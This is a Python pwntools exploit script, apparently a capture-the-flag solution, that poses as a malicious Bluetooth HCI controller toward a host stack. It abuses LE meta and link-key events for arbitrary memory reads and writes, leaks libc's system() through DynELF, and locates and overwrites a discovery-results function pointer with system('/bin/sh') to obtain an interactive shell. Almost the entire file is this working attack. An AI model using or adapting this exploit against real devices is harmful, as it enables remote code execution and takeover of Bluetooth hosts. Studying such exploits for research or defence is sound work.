#!/usr/bin/env python3

from pwn import *

r = remote(args.HOST, int(args.PORT))

CMD_CPT = 0x0e
CONN_RQ = 0x04
CONN_CPT = 0x03
LE_META = 0x3e
KEY_RQ = 0x17
KEY_NT = 0x18
INQ_CPT = 0x01

def event(ev, payload):
    r.send(bytes([4, ev, len(payload)]) + payload)

def readpkt():
    global reset
    feedback = None
    b = r.recvn(1)[0]
    if b == 1:
        pay = r.recvn(3)
        pay += r.recvn(pay[2])
        ret = b''
        cmd = u16(pay[:2])
        #ret = b'\1'
        '''
[*] got command: 00000000  03 0c 00
[*] got command: 00000000  03 10 00
[*] got command: 00000000  01 10 00
[*] got command: 00000000  09 10 00
[*] got command: 00000000  05 10 00
[*] got command: 00000000  23 0c 00
[*] got command: 00000000  14 0c 00
[*] got command: 00000000  25 0c 00
[*] got command: 00000000  38 0c 00
[*] got command: 00000000  39 0c 00
[*] got command: 00000000  05 0c 01 00
[*] got command: 00000000  16 0c 02 00  7d

[*] got command: 00000000  03 0c 00                                            │···│
[*] got command: 00000000  03 10 00                                            │···│
[*] got command: 00000000  01 10 00                                            │···│
[*] got command: 00000000  02 10 00                                            │···│
'''
        if cmd == 0x0c03:  # reset
            ret = b'\0'
            reset += 1
        elif cmd == 0x1003:  # local sup features
            ret = b'\0' b'\0\0\0\0\0\0\0\0'
        elif cmd == 0x1001:  # local ver info
            ret = b'\0' b'\x08' b'\0\0' b'\x08' b'\x59\x00' b'\0\0'
        elif cmd == 0x1009:  # BD_ADDR (needed by Linux only)
            ret = b'\0' b'\3\2\1\x36\xce\xf4'
#       elif cmd == 0x1005:  # buffer size (needed by Linux only)
#           ret = b'\0' b''
        elif cmd == 0x1002:  # local sup cmds
            ret = b'\0' + b'\0' * 64

        elif cmd == 0x040b:  # link key req reply
            feedback = pay[9:]

        if not feedback:
            info("got command:\n%s", hexdump(pay))

        event(CMD_CPT, b'\xff' + pay[:2] + ret)
    elif b == 2:
        pay = r.recvn(4)
        pay += r.recvn(u16(pay[2:]))
        info("got ACL:\n%s", hexdump(pay))
    elif b == 3:
        pay = r.recvn(3)
        pay += r.recvn(pay[2])
        info("got synch:\n%s", hexdump(pay))
    elif b == 5:
        pay = r.recvn(4)
        pay += r.recvn(u16(pay[2:]))
        info("got iso:\n%s", hexdump(pay))
    else:
        info("unknown pkt type: %#x", b)
    return feedback

pointer0 = 0x8048000

reset = 0

def set_addr(pointer):
    time.sleep(0.05)
    event(LE_META, b'\3' b'\0' b'\7\f' b'\xcc\xcc' + p32(pointer))
    time.sleep(0.05)

def raw_leak():
    event(KEY_RQ, b'\1\2\3\4\5\6')

    return readpkt()


def write016(data):
    assert len(data) == 16
    event(KEY_NT, b'\1\2\3\4\5\6' + data + b'\0')

def leak(addr):
    if addr == pointer0:  return b'\x7f'
    set_addr(addr - 9)
    return raw_leak()

while True:
    try:
        readpkt()
    except KeyboardInterrupt:
        # set up a connection
        event(CONN_RQ, b'\1\2\3\4\5\6' b'\0\0\0' b'\1')
        readpkt()  # optional

        # mark the connection active
        event(CONN_CPT, b'\0' b'\7\f' b'\1\2\3\4\5\6' b'\1' b'\0')
        readpkt()  # optional

        # leak address of system(3)
        delf = DynELF(leak, pointer0)
        system = delf.lookup('system', 'libc')
        info('system @ %#x', system)

        # look for normal_events in .rodata, which is normally right after .fini
        rodata0 = (delf._find_dt(dynelf.constants.DT_FINI) + 0x1000) & ~0xfff
        # min_length * 256 + event_code
        tab = [0x1ff, 0x13e, 0xa04, 0xb03, 0x616, 0x1718, 0x617, 0x932, 0x631, 0x736]
        for ptr in range(rodata0, rodata0 + 0x4000, 0x20):
            for i, val in enumerate(tab):
                if not delf.leak.compare(ptr + 2 * i * context.bytes, bytes([val & 0xff, val >> 8])):
                    break
            else:
                break
        else:
            info('normal_events not found?')
            ptr = 0

        px = bt_hci_inquiry_complete = 0
        if ptr:
            info('normal_events tab @ %#x', ptr)
            for p in range(ptr, ptr + 0x200, context.bytes * 2):
                code = delf.leak.u8(p)
                ln = delf.leak.u8(p, 1)
                fun = delf.leak.p(p, 1)
                info('normal_events[] = (%#x, %#x, %#x)', code, ln, fun)
                if code == INQ_CPT:
                    px = bt_hci_inquiry_complete = fun
                    break
            else:
                info('bt_hci_inquiry_complete not found?')

        win = 0
        if px:
            info('bt_hci_inquiry_complete @ %#x', bt_hci_inquiry_complete)
            for p in list(range(px - 8, px - 0x100, -1)) + list(range(px, px + 0x120)):
                delf.leak.b(p & ~0xf)  # speed up leaking
                if delf.leak.compare(p, b'\xff\x35'):  # x86-specific (pushl 0xADDR)
                    win = delf.leak.p(p + 2)
                    break
            else:
                info('`pushl discovery_results` not found?')

        if win:
            info('discovery_results @ %#x', win)
            set_addr(win + 16 - 9)
            write016(fit(b'/bin/sh\0', length=16))
            set_addr(win - 9)
            write016(fit([win + 16, system], length=16))
            event(INQ_CPT, b'\0')
            r.interactive()

        set_addr(0xdeadbeef)
        write016(b'\xa6' * 16)
